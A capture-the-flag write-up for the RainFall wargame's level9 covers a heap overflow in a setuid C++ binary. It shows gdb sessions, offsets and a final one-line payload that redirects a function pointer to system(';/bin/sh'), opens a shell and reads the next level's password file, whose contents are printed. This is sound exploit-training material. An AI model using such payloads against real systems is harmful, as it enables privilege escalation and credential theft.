<p align="justify">

Level9 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
```

Level9 rights:
```Shell
-rwsr-s---+ 1 bonus0 users  6720 Mar  6  2016 level9
```

Testing the binary:
```Shell
level9@RainFall:~$ ./level9
level9@RainFall:~$ ./level9 $(python -c 'print("A" * 300)')
Segmentation fault (core dumped)
```

Let's decompile it with Hex-Rays on https://dogbolt.org/ and see what is there:
- the code is written in c++
- unlike the other levels, there is no `system()` calls or direct access to the password
- two exploitable buffers are allocated on the heap with `new`
- we can exploit `memcpy()` because it takes argv[1] as argument and store it in one of the buffers

Let's check if `system()` belongs to the shared libraries, and if so, fetch its address:
```Shell
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7d86060 <system>
```
Here it is in little endian: `\x60\x60\xd8\xb7`.

We will store it in the buffer through argv[1]. If we want to overflow it, we can calculate the offset with a pattern from [this](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?):
```Shell
[...]
0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
0x0804867c <+136>:   mov    0x10(%esp),%eax
0x08048680 <+140>:   mov    (%eax),%eax
0x08048682 <+142>:   mov    (%eax),%edx
[...]
Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
```

Interestingly, this is it not the value that we must feed the generator. We have to do an extra step, because the true value is stored in `eax`:
```Shell
(gdb) info register
eax            0x41366441       1094083649
[...]
```

The generator gives us an offset of 108 bytes. We will pad our payload with 104 `A` (4 bytes are reserved for `system()` address). When disassembling `main()`, you can see at two memory allocations of 108 bytes by the `new` operator:
```Shell
[...]
0x08048610 <+28>:    movl   $0x6c,(%esp)
0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
[...]
0x08048632 <+62>:    movl   $0x6c,(%esp)
0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
[...]
```

Analysing the code in more depth, we realised three important things:
- the first 4 bytes of the 2nd buffer needs a valid address that contains an executable function
- the next 4 bytes can store the argument of that function
- if we overflow the 1st buffer with argv[1], we start writing on the 2nd buffer

This means that we must find the start of our buffer to place it into these first 4 bytes. To do so, we will run the program with gdb and place a breakpoint right after the allocation. The address will be stored in `eax`
```Shell
(gdb) disas main
Dump of assembler code for function main:
[...]
0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
0x0804867c <+136>:   mov    0x10(%esp),%eax <=========== eax being loaded with the address
[...]
(gdb) b *0x0804867c
Breakpoint 1 at 0x804867c
(gdb) run
Starting program: /home/user/level9/level9 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

Breakpoint 1, 0x0804867c in main ()
(gdb) info register $eax
eax            0x804a00c        134520844
```
Here it is in Little Endian: `\x0c\xa0\x04\x08`.

We're almost done, we just need to add the argument for `system()` as an extra string in the payload: `;/bin/sh`. If you don't add `;`, you will get permission denied, so you need to send an empty command first to skip that check.

And the final result is:
```Shell
level9@RainFall:~$ ./level9 $(python -c 'print("\x60\x60\xd8\xb7" + "A" * 104 + "\x0c\xa0\x04\x08" + ";/bin/sh")')
sh: 1: 
       : not found
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
</p>